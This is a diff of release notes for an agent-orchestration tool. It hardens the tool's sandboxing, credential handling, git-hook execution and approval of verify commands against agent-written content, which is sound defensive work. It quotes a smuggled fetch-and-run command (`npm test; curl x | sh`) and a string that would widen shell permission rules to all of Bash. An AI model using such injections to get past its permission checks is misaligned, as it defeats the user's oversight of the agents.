@@ -10,11 +10,17 @@
   agents (planner, workers, reviewer, documentation; not the tool-free progress reporter) also reach
   Anthropic's API and a gateway set in `ANTHROPIC_BASE_URL`, plus `sandbox.domains.agent`, and can
   still read their own login. The planner writes nothing in your checkout. Of `~/.claude` only the
-  session's transcript directory is writable, never the planner's auto-memory. Claude Code's own Bash
+  session's transcript directory is writable; the planner's is the one your own sessions in the
+  repository use, so there it can only add its session and continue the one it resumes, never change
+  your transcripts or the auto-memory. Card ids that differ only in case or in `_` against `-` would
+  share a transcript directory, so a plan or replan with such ids is refused. Claude Code's own Bash
   sandbox is switched off inside, your MCP servers and hooks run inside with the agent (SessionStart
-  hooks cannot run), and the agents are told what the sandbox allows. Codex keeps its own sandbox and
-  is not wrapped. `sandbox.mode` is `off` (the default, and every run says so), `auto` or `required`
-  (no run starts where the runtime does not work); `dulger doctor` says whether it works here.
+  hooks cannot run), and the agents are told what the sandbox allows. A sandboxed agent stays in
+  dulger's process group, so closing the terminal ends it as it ends an unsandboxed one. Codex keeps
+  its own sandbox and is not wrapped. `sandbox.mode` is `off` (the default, and every run says so),
+  `auto` or `required` (no run starts where the runtime does not work); `dulger doctor` says whether
+  it works here. Placeholder files a killed sandbox left in a worktree are removed before dulger
+  commits, also when the run is resumed without the sandbox.
 - The sandbox policy is read only from your own `~/.config/dulger/config.json`, `--sandbox` and
   `/sandbox`: a `sandbox` key in a repository's `.dulger/config.json` or a profile is ignored and
   reported, runs never save it, and resume always uses the machine's current policy.
@@ -22,14 +28,23 @@
   replaced no longer adds what its workers reported to the memory that later planners, workers and
   reviewers read. When a card lands, every task's learnings are kept, fix tasks included.
 - A card's verify commands, which the planner writes, are allowed to the reviewer only exactly as
-  written; `checker.allowedCommands` on Claude Code still accept added arguments. A verify command
-  containing `*` is not offered to a Claude Code reviewer, because its permission rules read `*` as a
-  wildcard. An API reviewer's `run_command` lists the verify commands and runs them as exact commands.
+  written; `checker.allowedCommands` on Claude Code still accept added arguments. A verify or
+  configured command that is blank or contains `*`, `(`, `)`, `\\`, a trailing `\` or a control
+  character is not offered to a Claude Code reviewer, because its permission rules would read it as
+  another rule: `*` is a wildcard, and a `)` followed by a space or comma ends the rule, so
+  `echo "a) Bash"` would allow all of Bash. An API reviewer's `run_command` lists the verify commands
+  and runs them as exact commands.
 - Verify commands, final verification, `worktreeSetup`, and the API tools' shell commands and
   `git diff` no longer receive the credentials dulger runs agents with: every configured provider's
   `apiKeyEnv`, `ANTHROPIC_API_KEY`, `ANTHROPIC_AUTH_TOKEN`, `CLAUDE_CODE_OAUTH_TOKEN`,
   `OPENAI_API_KEY`, `CODEX_API_KEY` and `DEEPSEEK_API_KEY`. Other variables, such as a project's
   `NPM_TOKEN`, still pass through. Claude Code and Codex themselves keep their environment.
+- dulger's own git commands in worktrees and on its branches (creating and removing worktrees, its
+  commits, merges and branch updates) no longer run git hooks. `--no-verify` skipped only pre-commit
+  and commit-msg, so post-checkout, post-commit, post-merge, prepare-commit-msg and
+  reference-transaction hooks ran with your privileges, and with a relative `core.hooksPath` or a hook
+  manager configured in the tree they were files a worker wrote. Merging the result branch into your
+  branch (`--merge`, `/merge`) still runs your repository's hooks.
 - A plan nobody could review is no longer dispatched. Without a terminal (piped stdin, CI) and
   without `--yes`, a new run, an order, or a resume of a run that has no cards yet plans, prints the
   board and stops with a non-zero exit; the run waits in the backlog. `dulger resume <runId>`
@@ -39,10 +54,11 @@
 - Verify commands a replan adds need approval. When the planner's new cards use a command that is
   neither on the board already nor in `checker.allowedCommands` (exact match, so `npm test; curl x | sh`
   is not `npm test`), the run asks before applying the replan and only a typed `yes` accepts. Enter,
-  any other answer, dismissing the question or stopping the run drop the replan and leave the board
-  as it was; running cards carry on meanwhile. `--yes` accepts them and logs which; it now reaches
-  `dulger order`, `resume` and `retry` too, and `/yes on` does the same. Without a terminal or
-  `--yes` the replan is dropped. The replanning planner is told to reuse the board's commands.
+  any other answer or dismissing the question drop the replan and leave the board as it was; running
+  cards carry on meanwhile. Stopping the run drops it too, without counting it against `maxReplans`.
+  `--yes` accepts them and logs which; it now reaches `dulger order`, `resume` and `retry` too, and
+  `/yes on` does the same. Without a terminal or `--yes` the replan is dropped. The replanning
+  planner is told to reuse the board's commands.
 - The README documents running the whole of dulger in a container or VM of your own, for a boundary
   the process sandbox does not give: the box works on a clone of its own and the host takes out only
   the result branch with `git fetch`, which runs none of that clone's hooks. It also covers the box's
